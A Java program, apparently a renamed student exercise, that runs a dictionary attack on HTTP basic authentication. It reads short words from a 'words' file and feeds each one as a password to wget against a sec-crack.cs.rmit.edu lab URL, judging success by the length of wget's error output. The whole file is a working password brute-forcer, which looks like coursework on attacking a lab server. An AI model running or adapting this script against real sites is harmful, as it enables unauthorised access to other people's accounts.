import java.io.*;
class Dictionary {
    public static void main ( String v0[] ) {
        try {
            File v1;
            v1 = new File ( "words" );
            FileReader v2;
            v2 = new FileReader ( v1 );
            BufferedReader v3;
            v3 = new BufferedReader ( v2 );
            URLHack v4;
            v4 = new URLHack();
            String v5;
            v5 = "";
            for ( ; ( v5 = v3.readLine() ) != null; ) {
                if ( v5.length() <= 3 ) {
                    v4.m00 ( v5 );
                }
            }
        } catch ( IOException v6 ) {
            System.out.println ( "Error: " + v6 );
        }
    }
}
class URLHack {
    public void m00 ( String v7 ) {
        Process v8;
        v8 = null;
        try {
            v8 = Runtime.getRuntime().exec ( "wget -nv --http-user= --http-passwd=" + v7 +
                                             " http://sec-crack.cs.rmit.edu./SEC/2/" );
            InputStream v9;
            v9 = v8.getErrorStream();
            BufferedReader v10;
            v10 = new BufferedReader ( new InputStreamReader ( v9 ) );
            String v11;
            v11 = "";
            v11 = v10.readLine();
            System.out.println ( v11 );
            if ( v11.length() == 21 ) {
                System.out.println ( "Invalid Password " + v7 );
            } else {
                System.out.println ( "Password is " + v7 );
                System.exit ( 0 );
            }
        } catch ( Exception v12 ) {
            System.out.println ( " ERROR " + v12 );
        }
    }
}
